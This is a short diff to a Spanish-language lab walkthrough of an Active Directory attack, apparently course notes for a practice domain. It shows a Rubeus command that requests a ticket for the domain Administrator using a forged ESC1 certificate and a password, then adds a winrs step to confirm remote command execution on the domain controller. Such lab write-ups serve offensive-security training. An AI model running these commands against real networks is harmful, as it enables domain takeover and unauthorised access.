@@ -1499,3 +1499,8 @@ Y ahora solicitamos el TGT
 ```shell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
 ```
+
+Comprobamos que podemos acceder
+```shell
+winrs -r:mcorp-dc cmd /c set username
+```
